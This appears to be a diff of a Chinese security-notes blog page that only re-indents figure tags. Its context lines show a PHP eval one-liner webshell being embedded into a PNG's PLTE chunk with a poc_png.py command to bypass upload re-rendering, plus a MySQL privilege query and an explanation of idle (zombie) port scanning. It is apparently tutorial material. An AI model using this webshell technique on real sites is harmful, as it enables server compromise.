@@ -414,10 +414,10 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, &lt;code&gt;ÐÏ.à&lt;/code&
 &lt;li&gt;
 &lt;p&gt;写入 &lt;code&gt;PLTE&lt;/code&gt; 数据块&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/png_trojan.png&#34; width=&#34;100px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_21-53-41_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;我们可以先利用imagemagick将图片转换为索引图像/基于调色板图像（Palette-based images） &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;convert png.png -type Palette png_trojan.png
@@ -425,12 +425,12 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, &lt;code&gt;ÐÏ.à&lt;/code&
     &gt;脚本&lt;/a&gt;来进行一句话木马的输入 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 poc_png.py -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php @eval($_POST[&amp;#34;a&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; -o png_trojan.png png_trojan.png
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-42-09_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;尝试上传 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;查看二次渲染后的图片，发现一句话木马插入成功，蚁剑连接成功 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-41-51_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -441,11 +441,11 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, &lt;code&gt;ÐÏ.à&lt;/code&
 &lt;p&gt;利用脚本， &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;下载二次渲染之后的图片，检查一句话木马 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-52-43_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;shell利用成功 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-58-39_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -637,7 +637,7 @@ jpg_payload&lt;/a&gt;  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;file_priv&lt;/code&gt; 是用户读写文件的权限，可以通过以下payload来查询权限&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_priv&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mysql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;HOST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-04-11_22-24-18_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;li&gt;
@@ -1675,13 +1675,13 @@ AKA &amp;ldquo;half-open&amp;rdquo; scanning&lt;/p&gt;
 &lt;li&gt;If a &lt;code&gt;SYN&lt;/code&gt; segment is sent to a host, it will respond with a &lt;code&gt;RST(reset)&lt;/code&gt; if the port closed&lt;/li&gt;
 &lt;/ul&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-13-15_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
 
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;If a &lt;code&gt;SYN&lt;/code&gt; segment is sent to a host, it will respond with a RST if the port closed,&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-13-25_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;li&gt;
@@ -1689,7 +1689,7 @@ AKA &amp;ldquo;half-open&amp;rdquo; scanning&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-13-30_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
 
 &lt;p&gt;Now let&amp;rsquo;s talk about the mechanism details with three scanning examples:&lt;/p&gt;
 &lt;!-- raw HTML omitted --&gt;
@@ -1708,25 +1708,25 @@ AKA &amp;ldquo;half-open&amp;rdquo; scanning&lt;/p&gt;
 &lt;p&gt;Since attackers get the initial IP ID value of Zombie computer, they will then sends a spoofed &lt;code&gt;SYN&lt;/code&gt; segment with Zombie computer&amp;rsquo;s IP address to the Victim&amp;rsquo;s computer&lt;/p&gt;
 &lt;p&gt;The Attacker pretend to be zombie computer, and communicate with the victim.&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-16-48_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+            &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Since the target port is open, the victim computer will response a &lt;code&gt;SYN/ACK&lt;/code&gt; segment to Zombie computer.&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-19-04_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+            &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;However, the zombie computer did not establish a session with Victim computer, so when it receive the &lt;code&gt;SYN/ACK&lt;/code&gt; segment, it will respond with a &lt;code&gt;RST&lt;/code&gt; segment to it, and meanwhile, increases its &lt;code&gt;IP ID&lt;/code&gt; by &amp;ldquo;one&amp;rdquo; to &lt;!-- raw HTML omitted --&gt;6,163&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-21-12_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+            &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;The attackers want to check the current &lt;code&gt;IP ID&lt;/code&gt;, thus they send another &lt;code&gt;SYN/ACK&lt;/code&gt; segment to The Zombie computer&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-22-07_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+            &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;li&gt;
@@ -1744,16 +1744,16 @@ AKA &amp;ldquo;half-open&amp;rdquo; scanning&lt;/p&gt;
 &lt;p&gt;So, what if the port is closed?
 This time, the spoofed &lt;code&gt;SYN&lt;/code&gt; segment will not get the response of &lt;code&gt;RST&lt;/code&gt;, which avoid the Zombie computer to interact with Victim computer, and the &lt;code&gt;IP ID&lt;/code&gt; did not increase, thus finally we will get the &lt;code&gt;IP ID&lt;/code&gt; only increase by &amp;ldquo;one&amp;rdquo;, which indicate the port is closed.&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-28-35_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-28-39_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-28-43_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-28-47_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -1763,13 +1763,13 @@ This time, the spoofed &lt;code&gt;SYN&lt;/code&gt; segment will not get the res
 &lt;p&gt;Idle Scan (Victim Port Fillterd)&lt;/p&gt;
 &lt;p&gt;If there is a firewall filter the spoofed &lt;code&gt;SYN&lt;/code&gt; segment, the Victim computer will not send anything to Zombie computer, which result in the same &lt;code&gt;IP ID&lt;/code&gt; as Port closed case.&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-31-04_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-30-15_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-05_16-30-40_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+        &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;/ul&gt;
